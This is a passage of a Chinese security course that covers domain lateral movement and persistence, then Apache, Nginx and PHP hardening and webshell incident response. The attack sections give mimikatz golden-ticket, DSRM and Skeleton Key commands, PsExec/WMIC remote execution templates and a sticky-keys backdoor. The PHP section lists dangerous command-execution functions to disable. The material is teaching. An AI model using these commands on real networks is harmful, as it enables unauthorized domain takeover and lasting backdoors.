<div class="outline-text-4" id="text-账号密码连接">
<p>
前面已经拿到域管理员的账号、密码，就可以尝试去登录下域内的其他主机，下
面我们尝试去登录下域控主机192.168.69.138。登录方式有很多，常用的是下面
几种：
</p>

<ul class="org-ul">
<li><b>3389 登录</b></li>
</ul>

<p>
先扫描端口，看目标是否打开 3389，然后用远程桌面连接工具 mstsc.exe去登
录，下图是域控主机的端口扫描结果，发现没有开 3389，就先放弃。
</p>


<figure id="org07056df">
<img src="./images/Cgp9HWAeEfKAWSFSAAFcqQVWYB8312.png" alt="Cgp9HWAeEfKAWSFSAAFcqQVWYB8312.png" width="80%">

</figure>

<p>
图 24 扫描端口
</p>


<figure id="orgc813fce">
<img src="./images/Cgp9HWAeEfqALvbvAAB93cLa61g706.png" alt="Cgp9HWAeEfqALvbvAAB93cLa61g706.png" width="80%">

</figure>

<p>
图 25 远程桌面连接
</p>

<ul class="org-ul">
<li><b>IPC</b></li>
</ul>

<p>
IPC（Internet Process Connection），进程间连接，它是为了实现进程间通信
而开放的命名管道。使用IPC 连接要求对方开启 139、445端口才行，同时对方
开启了默认共享，这样我们才能访问到共享目录的内容。IPC连接命令格式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">net use \\{目标IP}\ipc\$ "{密码}" /user:{用户名}
</pre>
</div>

<p>
下面是使用示例，由于虚拟机要求更改密码才能使用域，因此我把原密码改为“lagou@2019”了。
</p>


<figure id="org72141bd">
<img src="./images/CioPOWAeEgyAH8HSAABNZ8-054c288.png" alt="CioPOWAeEgyAH8HSAABNZ8-054c288.png" width="80%">

</figure>

<p>
图 26 IPC 连接
</p>

<ul class="org-ul">
<li><b>PsExec</b></li>
</ul>

<p>
<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a>是 SysInternals套件中的工具，用于命令行下与目标主机连接和控制，
其命令格式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">psexec \\{目标IP} -u {用户名} -p {密码} cmd.exe
</pre>
</div>

<p>
metasploit 就自带有 psexec 模块，用它可直接连接登录主机。
</p>


<figure id="orgd8f9795">
<img src="./images/CioPOWAeEiCAFXs4AAJqKBM7rnw147.png" alt="CioPOWAeEiCAFXs4AAJqKBM7rnw147.png" width="80%">

</figure>

<p>
图 27 利用 Metasploit psexec 登录主机
</p>

<ul class="org-ul">
<li><b>WMI</b></li>
</ul>

<p>
WMI（Windows Management Instrumentation，Windows管理规范）是由一系列工
具组成的，支持本地和远程管理计算机系统，使用命令格式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">wmic /node:{目标IP} /user:{用户名} /password:{密码} process call create "{命令}"
</pre>
</div>


<figure id="org78de036">
<img src="./images/CioPOWAeEimAG3tlAAAfUzrGXD0403.png" alt="CioPOWAeEimAG3tlAAAfUzrGXD0403.png" width="80%">

</figure>

<p>
图 28 使用 WMI 远程执行命令
</p>
</div>
</div>
<div id="outline-container-远程漏洞攻击" class="outline-4">
<h4 id="远程漏洞攻击">3.远程漏洞攻击</h4>
<div class="outline-text-4" id="text-远程漏洞攻击">
<p>
如果能找到一个其他主机存在的远程漏洞，借助已攻破的主机发起利用，那么也
可以达到横向移动的目的。还记得“永恒之蓝”漏洞吗？一款叫作 WannaCry 的
勒索病毒袭击全球，其利用的正是“永恒之蓝”（Windows SMB远程命令执行漏
洞），Metasploit 中已集成该漏洞的利用。
</p>

<p>
你可以多关注下最新的一些远程漏洞，有时直接利用远程漏洞获得域内其他主机的控制权也是一种快捷的方式。
</p>
</div>
</div>
<div id="outline-container-跨域攻击" class="outline-4">
<h4 id="跨域攻击">4.跨域攻击</h4>
<div class="outline-text-4" id="text-跨域攻击">
<p>
对于父子域这种双向信息的情况，我们可以利用 SID History 进行跨域攻击，
使用命令如下。
</p>

<ul class="org-ul">
<li>使用 mimikatz 获取子域的 krbtgt Hash，krbtgt 是域内默认创建的账号，
域内每个账号的票据都是由它生成的，只要拿到 krbtgt 的密码 Hash，就可
以随意伪造票据，进而使用票据登录域控制器。</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">lsadump::lsa /patch
</pre>
</div>

<ul class="org-ul">
<li>使用 powerview 获取父子域的 sid：</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">Get-DomainComputer -Domain {父域名}
Get-DomainComputer -Domain {子域名}
</pre>
</div>

<ul class="org-ul">
<li>利用 mimikatzt 向内存注入票据，添加 SID＝519 企业管理员。</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">kerberos::golden /user:Administrator /krbtgt:{第一步获取的hash} /domain:{域名} /sid:{子域sid} /sids:{替换父域sid最后一个值为519} /ptt
</pre>
</div>

<ul class="org-ul">
<li>访问父域的共享目录</li>
</ul>

<div class="org-src-container">
<pre class="src src-lang-java">dir \\{父域名}\c$
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-权限维持" class="outline-3">
<h3 id="权限维持">权限维持</h3>
<div class="outline-text-3" id="text-权限维持">
<p>
有时服务器被重启，或者修改密码之后，我们就失去了对目标的控制权，因此我
们得想办法去维持权限的持久性，保证我们在需要的时候都能够远程控制。
</p>
</div>
<div id="outline-container-webshell" class="outline-4">
<h4 id="webshell">1.WebShell</h4>
<div class="outline-text-4" id="text-webshell">
<p>
如果是 Webshell，那服务器重启后也没影响。关于Webshell，前面课程已介绍
过，此处不再赘述。
</p>
</div>
</div>
<div id="outline-container-系统后门" class="outline-4">
<h4 id="系统后门">2.系统后门</h4>
<div class="outline-text-4" id="text-系统后门">
<p>
前面我们使用 metasploit 利用漏洞去获取 meterpreter 后门也是一种方式，
你可以把后门添加到自启动项，保证重启后仍有效，这种比较适合开启监听后门，
因为有时候我们没有一直在本地开启监听去等待对方连接。
</p>

<p>
粘滞键后门是最常用的后门留取方式，粘滞键是指连续按 5 次 Shift键而触发
的，它执行的是 windows\system32\sethc.exe 程序，我们用后门程序替换掉就
可以。
</p>


<figure id="orgde529cb">
<img src="./images/Cgp9HWAeEjSAG5D7AAB7pk5Jmlc919.png" alt="Cgp9HWAeEjSAG5D7AAB7pk5Jmlc919.png" width="80%">

</figure>

<p>
图 29 粘滞键
</p>

<p>
除此之外，你还可以使用注册表、计划任务等方式来留取后门。
</p>
</div>
</div>
<div id="outline-container-域控维权" class="outline-4">
<h4 id="域控维权">3.域控维权</h4>
<div class="outline-text-4" id="text-域控维权">
<p>
在拿到域控后，攻击者会对现有的权限进行持久化操作，以保证长期有效地控制
它，常用的方法有以下两种。
</p>

<ul class="org-ul">
<li><b>DSRM</b></li>
</ul>

<p>
DSRM，目录服务恢复模式是 Windows 域控制器的安全模块启动项，你可以通过
它为域控制器设置一个本地管理员账户，然后同步其他账号的密码为 DSRM 密码，
再修改注册表的 DrmAdminLogonBehavior 为 2，即允许使用 DSRM 管理员账号
登录域控制器：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21516;&#27493;DSRM&#23494;&#30721;</span>
ntdsutil
<span style="color: #483d8b;">set</span> DSRM password
SYNC FROM DOMAIN ACCOUNT username
Q
Q

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;&#27880;&#20876;&#34920;&#37197;&#32622;&#65306;</span>
reg add &#8220; HKLM\System\CurrentControlSet\Control\Lsa&#8221; /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
</pre>
</div>

<p>
之后就可以用 mimikatz 去连接：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">sekurlsa::pth /domain:computername /user:Administrator /ntlm:{密码hash}
</pre>
</div>

<ul class="org-ul">
<li><b>Skeleton Key</b></li>
</ul>

<p>
Mimikatz
支持安装万能密码，通过以下命令即可将“mimikatz”作为万能密码去连接域控，哪怕域控密码被修改也可使用。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">privilege::debug 
misc::skeleton
</pre>
</div>

<p>
除此之外，还可以利用 mimikatz 的 mimilib.dll 去记录重启后登录的密码，
还有用户 SID History 属性等方式，都可以利用 Mimikatz 工具来实现，它在
权限持久化方面提供了不少实用的功能。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
本课内容较长一些，主要是内网渗透涉及的知识点太多太杂了，限于篇幅，我也
只能介绍一些最主要最常用的技术，按内网渗透流程来分顺序讲解：内网信息收
集、通信隧道建设、权限提升、横向移动、权限维持。
</p>

<p>
更多内网渗透技巧，推荐你去看《内网安全攻防：渗透测试实战指南》这本书，
其中还有 Cobalt Strike 这款在内网渗透中常被使用到的渗透测试框架的详细
介绍，它是收费版的，另有社区版叫 armitage ，你可以花点时间去研究下
Cobalt Strike 的使用，相信对提高内网渗透实战能力会有很大的帮助。
</p>

<p>
<a id="orgc871165"></a>
</p>
<blockquote>
<p>
<b>模块三， Web 安全建设</b>
</p>
</blockquote>
</div>
</div>
</section>
<section id="outline-container-构建防线：服务器安全加固" class="outline-2">
<h2 id="构建防线：服务器安全加固">构建防线：服务器安全加固</h2>
<div class="outline-text-2" id="text-构建防线：服务器安全加固">
<p>
关于“模块二漏洞攻防案例”的内容我们已经讲完了，从本节课开始，将进入
“模块三 Web安全建设”内容，我将给你介绍企业内部的一些 Web安全建设工作，
如何更加全面地防御 Web 漏洞的攻击。
</p>

<p>
本节课主要向你介绍一些服务器安全加固的策略，以主流的 Apache 和 Nginx
服务器为例，有时即使存在漏洞，有安全加固策略存在，可以提高对方的攻击成
本，防止被进一步攻击。PHP 本身也提供有一些安全配置功能可用于安全加固，
本节课会一并介绍。
</p>
</div>
<div id="outline-container-apache-服务器加固" class="outline-3">
<h3 id="apache-服务器加固">Apache 服务器加固</h3>
<div class="outline-text-3" id="text-apache-服务器加固">
<p>
Apache 是世界使用排名第一的 Web服务器软件，由于其跨平台和安全性而被广
泛使用，我们前面课程介绍过的靶场很多就使用到Apache。
</p>

<p>
下面梳理下 Apache 上的安全配置建议，以帮助对服务器进行安全加固。
</p>
</div>
<div id="outline-container-删除默认页面" class="outline-4">
<h4 id="删除默认页面">1.删除默认页面</h4>
<div class="outline-text-4" id="text-删除默认页面">
<p>
Apache安装后会有如下图所示的默认页面，安装后仅用于测试，用于生产环境中
时需要删除，这里需要删除 icons 和 manual 两个目录文件，以避免不必要的
信息泄露。
</p>


<figure id="org6ec8de7">
<img src="./images/CioPOWAlYGWAN3nAAAZWrXa2TEg855.png" alt="CioPOWAlYGWAN3nAAAZWrXa2TEg855.png" width="80%">

</figure>

<p>
图 1 Apache 默认页面
</p>
</div>
</div>
<div id="outline-container-关闭目录浏览功能" class="outline-4">
<h4 id="关闭目录浏览功能">2.关闭目录浏览功能</h4>
<div class="outline-text-4" id="text-关闭目录浏览功能">
<p>
Apache默认允许目录浏览，如果目录下找不到可浏览器的页面，就会出现目录浏
览问题，造成信息泄露。
</p>


<figure id="org9fe9770">
<img src="./images/CioPOWAlYMCAcmboAAJy0sirrC8688.png" alt="CioPOWAlYMCAcmboAAJy0sirrC8688.png" width="80%">

</figure>

<p>
图 2 在线浏览目录
</p>

<p>
Ubuntu 是通过修改 Apache 配置文件/etc/apache2/apache2.conf，其他平台大
多是叫 httpd.conf的配置文件名，修改“Indexes”为“－Indexes”：
</p>


<figure id="orgb789f89">
<img src="./images/Cgp9HWAlYPSACO-AAACZ1y8MML4168.png" alt="Cgp9HWAlYPSACO-AAACZ1y8MML4168.png" width="80%">

</figure>

<p>
图 3 关闭目录浏览
</p>
</div>
</div>
<div id="outline-container-开启访问日志" class="outline-4">
<h4 id="开启访问日志">3.开启访问日志</h4>
<div class="outline-text-4" id="text-开启访问日志">
<p>
在浏览器被攻击时，通过日志可以帮助回溯整个安全事件的过程，有助于定位漏
洞成因和攻击者。默认情况下，Apache已开启访问日志记录，你需要确认下配置
文件是否开启 CustomLog 的日志路径设置：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">/etc/apache2/sites-available/default-ssl.conf
/etc/apache2/sites-available/000-default.conf
</pre>
</div>


<figure id="orge112771">
<img src="./images/CioPOWAlYQmAVimdAAB2Iy54tek342.png" alt="CioPOWAlYQmAVimdAAB2Iy54tek342.png" width="80%">

</figure>

<p>
图 4 开启访问日志
</p>


<figure id="org065abeb">
<img src="./images/Cgp9HWAlYR-AM5-xAAFu4xQ1xyQ532.png" alt="Cgp9HWAlYR-AM5-xAAFu4xQ1xyQ532.png" width="80%">

</figure>

<p>
图 5 访问日志文件
</p>

<p>
上面是 Ubuntu 平台的情况，如果是存在 httpd.conf配置文件的其他平台，则
直接在 httpd.conf 查看是否有 CustomLog 配置。
</p>
</div>
</div>
<div id="outline-container-禁止特定目录解析-php" class="outline-4">
<h4 id="禁止特定目录解析-php">4.禁止特定目录解析 PHP</h4>
<div class="outline-text-4" id="text-禁止特定目录解析-php">
<p>
对于不需要执行 PHP 脚本的目录，可禁止 PHP解析，这种配置可有效防止上传
漏洞的攻击，特别是上传目录的 PHP 解析限制。
</p>

<p>
通过 Apache 配置文件中对目录权限做如下修改，以禁止特定目录解析 PHP：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;Directory "/www/html/uploads"&gt;
  php_flag engine off
&lt;/Directory&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-不以-root-启动-apache" class="outline-4">
<h4 id="不以-root-启动-apache">5.不以 Root 启动 Apache</h4>
<div class="outline-text-4" id="text-不以-root-启动-apache">
<p>
默认情况下，Apache 已禁止 Root 启动，你可以在 Apache 配置文件中再确认下
User 与 Group 的配置值。
</p>

<p>
下面是 apache2.conf 为配置文件时的情况，它通过 /etc/apache2/envars 指
定变量名来设置 User 和 Group：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">/etc/apache2/apache2.conf</span>
User ${<span style="color: #a0522d;">APACHE_RUN_USER</span>}
Group ${<span style="color: #a0522d;">APACHE_RUN_GROUP</span>}

<span style="color: #b22222;"># </span><span style="color: #b22222;">/etc/apache2/envars</span>
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">APACHE_RUN_USER</span>=www-data
<span style="color: #483d8b;">export</span> <span style="color: #a0522d;">APACHE_RUN_GROUP</span>=www-data
</pre>
</div>

<p>
如果是 httpd.conf，一般就直接用 User 与 Group 来指定用户名和用户组：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">User apache
Group apache
</pre>
</div>
</div>
</div>
<div id="outline-container-禁止访问外部文件" class="outline-4">
<h4 id="禁止访问外部文件">6.禁止访问外部文件</h4>
<div class="outline-text-4" id="text-禁止访问外部文件">
<p>
当网站存在目录遍历漏洞时，攻击者可能通过 ../ 来访问系统上的任意目录，
通过禁止 Apache 访问网站目录以外的目录和文件，可以有效地降低这种攻击带
来的危害。
</p>

<p>
修改 Apache 配置文件，先禁止所有目录的访问，然后再开启可访问的目录。
</p>

<div class="org-src-container">
<pre class="src src-lang-java"># 先禁止任何目录访问
    Order Deny,Allow
    Deny from all

# 设置可访问的目录
    Order Allow,Deny
    Allow from {网站根目录}
</pre>
</div>
</div>
</div>
<div id="outline-container-错误页面重定向" class="outline-4">
<h4 id="错误页面重定向">7.错误页面重定向</h4>
<div class="outline-text-4" id="text-错误页面重定向">
<p>
Apache 错误页面重定向功能可以防止敏感信息泄露，比如网站路径等信息。
</p>

<p>
修改 Apache 配置文件，指定不同响应号的返回页面文件：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">ErrorDocument 400 /custom400.html
ErrorDocument 401 /custom401.html
ErrorDocument 403 /custom403.html
ErrorDocument 404 /custom404.html
ErrorDocument 405 /custom405.html
ErrorDocument 500 /custom500.html
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-nginx-服务器加固" class="outline-3">
<h3 id="nginx-服务器加固">Nginx 服务器加固</h3>
<div class="outline-text-3" id="text-nginx-服务器加固">
<p>
Nginx 是一款著名且免费的网页服务器软件，在世界范围内应用非常广泛。Nginx
配置文件通常位于
/usr/local/etc/nginx/nginx.conf，如果没找到，你可以通过命令 locate
nginx.conf 来搜索。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ locate nginx.conf
/usr/local/etc/nginx/nginx.conf
/usr/local/etc/nginx/nginx.conf.default
...
</pre>
</div>

<p>
各种安全加固方式都可通过 nginx.conf 来完成。
</p>
</div>
<div id="outline-container-关闭目录浏览" class="outline-4">
<h4 id="关闭目录浏览">1.关闭目录浏览</h4>
<div class="outline-text-4" id="text-关闭目录浏览">
<p>
Nginx 默认不允许目录浏览，你可以再确认下配置文件中的 autoindex是否配置
为 off，以防止敏感信息泄露。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">autoindex off
</pre>
</div>
</div>
</div>
<div id="outline-container-开启访问日志-1" class="outline-4">
<h4 id="开启访问日志-1">2.开启访问日志</h4>
<div class="outline-text-4" id="text-开启访问日志-1">
<p>
开启日志有助追踪攻击途径，以及定位攻击者。默认情况下，Nginx会开启访问
日志，你可在配置文件中确认下是否已开启：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">access_log /backup/nginx_logs/access.log combined;
</pre>
</div>
</div>
</div>
<div id="outline-container-限制特定目录解析-php" class="outline-4">
<h4 id="限制特定目录解析-php">3.限制特定目录解析 PHP</h4>
<div class="outline-text-4" id="text-限制特定目录解析-php">
<p>
在 Apache 已介绍过，对于不需要执行 PHP 脚本的目录，可禁止 PHP 解析，这
种配置可有效防止上传漏洞的攻击，特别是上传目录的 PHP解析限制，通过
nginx.conf 配置文件使用 deny all 来限制特定目录被 PHP解析：
</p>

<pre class="example" id="org8e365c3">
location ~* ^/data/cgisvr/log/.*\.(php|php5)$
{
    deny all;
}
</pre>
</div>
</div>
<div id="outline-container-删除默认页面-1" class="outline-4">
<h4 id="删除默认页面-1">4.删除默认页面</h4>
<div class="outline-text-4" id="text-删除默认页面-1">
<p>
Nginx也存在默认页面，上线后应该删除，防止不必要的信息泄露，可通过删除
如下配置信息来解决。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">location /doc {
root /usr/share;
autoindex on;
allow 127.0.0.1;
deny all;
}

location /images {
root /usr/share;
autoindex off;
}
</pre>
</div>


<figure id="org1920f87">
<img src="./images/CioPOWAlYTWAQ7NXAAIwx06JbKw323.png" alt="CioPOWAlYTWAQ7NXAAIwx06JbKw323.png" width="80%">

</figure>

<p>
图 6 Nginx 默认页面
</p>
</div>
</div>
</div>
<div id="outline-container-php-安全配置" class="outline-3">
<h3 id="php-安全配置">PHP 安全配置</h3>
<div class="outline-text-3" id="text-php-安全配置">
<p>
PHP是比较常用的网站开发语言，其对安全也很重视，提供了不少安全函数和配
置功能。下面介绍一些常用的PHP 安全配置方法，都是通过 php.ini 来配置，
比如 PHP 7.4 的配置文件路径位于 /etc/php/7.4/apache2/php.ini。
</p>
</div>
<div id="outline-container-限制脚本访问权限" class="outline-4">
<h4 id="限制脚本访问权限">1.限制脚本访问权限</h4>
<div class="outline-text-4" id="text-限制脚本访问权限">
<p>
PHP 默认配置允许 php 脚本程序访问服务器上的任意文件，为避免 php
脚本访问不该访问的文件，从一定程度上限制了 php
木马的危害，一般设置为只能访问网站的目录：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">open_basedir = /usr/local/apache2/htdocs（网站根目录）
</pre>
</div>
</div>
</div>
<div id="outline-container-禁止危险函数" class="outline-4">
<h4 id="禁止危险函数">2.禁止危险函数</h4>
<div class="outline-text-4" id="text-禁止危险函数">
<p>
利用 php 的特殊函数可以执行系统命令，查询任意目录，增加修改删除文件等。
php木马程序常见使用的函数为 exec、popen、system、passthru、shell_exec
等，如下设置可禁止使用这些危险函数：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">disable_functions = exec,popen,system,passthru,shell_exec,escapeshellarg,escapeshellcmd,proc_close,proc_open
</pre>
</div>
</div>
</div>
<div id="outline-container-关闭错误消息显示" class="outline-4">
<h4 id="关闭错误消息显示">3.关闭错误消息显示</h4>
<div class="outline-text-4" id="text-关闭错误消息显示">
<p>
一般 PHP 错误信息可能会包含网站路径或 SQL 查询语句等敏感信息，这些信息
为攻击者提供有价值的信息，因此应该禁止错误显示，配置方式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">display_errors = Off
</pre>
</div>
</div>
</div>
<div id="outline-container-禁止访问远程文件" class="outline-4">
<h4 id="禁止访问远程文件">4.禁止访问远程文件</h4>
<div class="outline-text-4" id="text-禁止访问远程文件">
<p>
允许访问 URL 远程资源使得 PHP 应用程序的漏洞利用变得更加容易，php 脚本
若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传 web 木马，因
此建议关闭远程文件访问功能，若需要访问可采用其他方式，比如 libcurl 库，
配置如下:
</p>

<div class="org-src-container">
<pre class="src src-lang-java">allow_url_fopen = Off
allow_url_include = Off
</pre>
</div>

<p>
PHP在这几年提升了不少安全功能，很多功能都默认开启，甚至直接去掉一些原
有一些可配置的安全功能，比如magic_quotes_gpc。
</p>
</div>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课主要分享了 Apache、Nginx 和 PHP 的一些安全配置方案，帮助抵御漏洞
的攻击，提高漏洞利用难度，即使被入侵后，仍有可回溯追踪的办法，这在后续
的入侵排查过程中非常重要，这点在下一节课中介绍，我们下一节课中见。
</p>
</div>
</div>
</section>
<section id="outline-container-h:dd24e325-1dc8-4a20-acd4-3d96def36ea7" class="outline-2">
<h2 id="h:dd24e325-1dc8-4a20-acd4-3d96def36ea7">入侵排查：阻断与追踪黑客</h2>
<div class="outline-text-2" id="text-h:dd24e325-1dc8-4a20-acd4-3d96def36ea7">
<p>
本套课程花了不少篇幅讲解各种常见的 Web漏洞攻防知识，但很多情况下，我们
是无法保证 100% 的绝对安全。
</p>

<p>
如果你的网站真的被入侵攻击了，那应该怎么办呢？如何将损伤控制到最小？如
何防止被再一次入侵？如何去追踪黑客的攻击来源？
</p>

<p>
所以，这节课我们就重点聊下如何进行入侵排查去阻断与追踪黑客。
</p>

<p>
网站被入侵的常见方法是上传 Webshell，这些在<a href="#文件上传漏洞：种植服务器木马的捷径">《13 ​|文件上传漏洞：种植服
务器木马的捷径》</a>中都介绍过。因此本节课主要针对利用漏洞入侵后上传
Webshell获取控制权的情况，介绍一些 Webshell入侵应急处理方法，并会结合
前面课程演示过的入侵过程，以实例来讲解入侵排查过程。
</p>

<blockquote>
<p>
这一过程，我们仍然以 Linux 平台为主。
</p>
</blockquote>
</div>
<div id="outline-container-网站入侵检测" class="outline-3">
<h3 id="网站入侵检测">网站入侵检测</h3>
<div class="outline-text-3" id="text-网站入侵检测">
<p>
想要获取被入侵的情况，除了外部报告、网页被篡改这两种途径，你自己还 <code>需
要建立完善的入侵检测能力</code> 。
</p>

<p>
毕竟多数情况下， <code>外部报告是为了获取奖金</code> ，看看国内外的 SRC平台就知道；
 而 <code>网页被篡改通常是为了炫耀</code> ，这种反而不多，因此攻击者都会以隐藏为
 主，以保持对服务器的长期控制。
</p>

<p>
基于上述情况，如果你想更加主动、及时、全面地感知到网站被入侵，就需要有
一套自己的入侵检测系统，可以自研或者采购，常见的网站入侵检测方法有以下
三种。
</p>

<ul class="org-ul">
<li><p>
<b>基于流量检测</b>
</p>

<p>
通过收集服务器的网络流量进行数据分析，检测攻击者发送的 payload 攻击
特征，特别是 Webshell 特征进行检测和告警，以便及时发现被入侵情况。
</p></li>

<li><p>
<b>基于文件检测</b>
</p>

<p>
通过分析文件判断是否为恶意后门，与我们平常的病毒扫描一样，同时排查日
志文件也可以发现入侵过程，有利于回溯整个攻击过程，比如稍后会介绍的河
马检测工具。
</p></li>

<li><p>
<b>基于行为检测</b>
</p>

<p>
通过动态检测系统上的执行行为来判断是否为恶意行为，是否被入侵攻击。
</p>

<p>
<a href="#SQL 注入：漏洞的检测与防御">《08 | SQL 注入：漏洞的检测与防御》</a>已介绍过的 RASP 也是检测入侵攻击
的手段，比如通过 hook java/php底层的命令执行函数，来判断当前是否执行
到命令执行函数，若是，就表明可能已经被外部入侵。
</p></li>
</ul>
</div>
</div>
<div id="outline-container-应急处置流程" class="outline-3">
<h3 id="应急处置流程">应急处置流程</h3>
<div class="outline-text-3" id="text-应急处置流程">
<p>
网站入侵，通常是由于网站漏洞的存在，导致被上传了 Webshell 文件。所以围
绕漏洞，你可以采取以下步骤进行应急处置。
</p>
</div>
<div id="outline-container-关闭外网进行排查" class="outline-4">
<h4 id="关闭外网进行排查">1.关闭外网进行排查</h4>
<div class="outline-text-4" id="text-关闭外网进行排查">
<p>
为防止被进一步入侵窃取敏感信息，或者被内网渗透，应该在第一时间关闭外网，
保留现场环境进行排查，等处理完善后再上线。先用 IPConfig 查看公司 IP 所
在的网卡，比如是 eth1，那么就可以使用 ifdown eth1 关闭外网。
</p>
</div>
</div>
<div id="outline-container-webshell-检测分析与清除" class="outline-4">
<h4 id="webshell-检测分析与清除">2.Webshell 检测、分析与清除</h4>
<div class="outline-text-4" id="text-webshell-检测分析与清除">
<ul class="org-ul">
<li><b>检测</b> Webshell 可以使用一些现成工具，比如 Windows 上的 D 盾、支持
Windows 和 Linux 的河马，还有支持 Linux的长亭云牧，使用都很简单，指
定目录/文件进行扫描即可。</li>
</ul>

<blockquote>
<p>
更具体的使用介绍可以参考下文的“常用的排查工具”。
</p>
</blockquote>

<ul class="org-ul">
<li>通过 <b>分析</b> Webshell 文件的创建时间，也可以推测出入侵事件发生的时间
段，不过有时候文件创建时间也可能被篡改，注意结合日志信息来综合判断；
接着就是分析 Webshell 的行为，看是否还有其他后门存在，或者一些破坏性
行为。</li>

<li>最后 <b>清除</b> 所有后门文件，清除前先留存一份，方便后续分析。</li>
</ul>
</div>
</div>
<div id="outline-container-web-日志分析" class="outline-4">
<h4 id="web-日志分析">3.Web 日志分析</h4>
<div class="outline-text-4" id="text-web-日志分析">
<p>
上一节课<a href="#构建防线：服务器安全加固">《18 ​| 构建防线：服务器安全加固》</a>中就提到要开启 Web日志，目的
就用于此处。通过分析日志，帮助我们找到漏洞的位置，回溯整个攻击过程，同
时通过定位IP 来追踪黑客。
</p>

<p>
不同的服务器系统有不同的日志位置：
</p>


<figure id="org0121fb9">
<img src="./images/Cgp9HWAqXSOADMa3AAEdCFivCf4606.png" alt="Cgp9HWAqXSOADMa3AAEdCFivCf4606.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-系统后门与日志排查" class="outline-4">
<h4 id="系统后门与日志排查">4. 系统后门与日志排查</h4>
<div class="outline-text-4" id="text-系统后门与日志排查">
<p>
攻击者为了实现对服务器的长期控制，通常会在系统上留存后门等恶意程序。
</p>

<p>
所以在清除 Webshell 后，还应该对系统进行全面排查，比如是否有可疑文件、
进程，进行一次本地病毒的查杀，确保所有恶意程序都被清除干净；否则，即使
你修复漏洞了，攻击者仍可通过后门控制你的服务器，再一次遭遇被入侵的局面。
</p>

<p>
为方便你使用，我整理了一份常用的排查命令和工具的使用列表。
</p>


<figure id="org627d96d">
<img src="./images/CioPOWAqXT6AUHbKAAiWbH7k9uk805.png" alt="CioPOWAqXT6AUHbKAAiWbH7k9uk805.png" width="80%">

</figure>
</div>
</div>
<div id="outline-container-漏洞分析复现与修复" class="outline-4">
<h4 id="漏洞分析复现与修复">5. 漏洞分析、复现与修复</h4>
<div class="outline-text-4" id="text-漏洞分析复现与修复">
<p>
通过前面分析 Web 日志来定位漏洞，通过访问 Webshell 的 IP 来收集此 IP
的所有访问记录，根据记录我们可以推测出以下两种情况：
</p>

<ul class="org-ul">
<li>比如，访问上传接口后就访问 Webshell，那就有可能存在上传文件漏洞；</li>

<li>比如，大批量地尝试登录后台，那可能是在暴力破解密码，可以看攻击者是否
成功访问后台，来判断是否破解成功。</li>
</ul>

<p>
之后就是去尝试 <b>重现</b> 漏洞，以验证前面的推测。若确认漏洞存在，就需要进
行 <b>修复</b> ，修复后才能上线。
</p>
</div>
</div>
<div id="outline-container-安全加固后上线" class="outline-4">
<h4 id="安全加固后上线">6. 安全加固后上线</h4>
<div class="outline-text-4" id="text-安全加固后上线">
<p>
可参考<a href="#构建防线：服务器安全加固">《18 ​|构建防线：服务器安全加固》</a>介绍的服务器加固方法进行安全加固，
此处不再赘述，等加固完成后再上线恢复业务。
</p>
</div>
</div>
</div>
<div id="outline-container-常用的排查工具" class="outline-3">
<h3 id="常用的排查工具">常用的排查工具</h3>
<div class="outline-text-3" id="text-常用的排查工具">
</div>
<div id="outline-container-河马" class="outline-4">
<h4 id="河马">1.<a href="https://www.shellpub.com/">河马</a></h4>
<div class="outline-text-4" id="text-河马">
<p>
专注于 Webshell查杀研究的工具，采用传统特征与云端大数据双引擎的查杀技
术，支持 Windows与 Linux 平台，跨平台的工具比较方便，使用也简单，通过
指定目录路径即可开启扫描：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">hm scan ./Web目录
hm deepscan ./Web目录
</pre>
</div>
</div>
</div>
<div id="outline-container-牧云cloudwalker" class="outline-4">
<h4 id="牧云cloudwalker">2.<a href="https://github.com/chaitin/cloudwalker">牧云（CloudWalker）</a></h4>
<div class="outline-text-4" id="text-牧云cloudwalker">
<p>
牧云是由长亭科技开发的一款开源的 Webshell 检测工具，支持 macOS 与Linux
系统，可以输出 Html 检测报告。目前检测结果分为 5个级别（Risk:1~5），如
下图所示，级别越高说明检测出 Webshell的可能性越高，如果没有级别则说明
不存在 Webshell 风险。
</p>

<blockquote>
<p>
该开源工具已停止更新，长亭已经转做企业版收费，不再开源。
</p>
</blockquote>

<p>
牧云使用如下命令扫描指定目录并生成报告：
</p>

<pre class="example" id="orge80ffd4">
$ ./webshell-detector -html -output result.html /path/to/web-root/
</pre>


<figure id="org0f843b4">
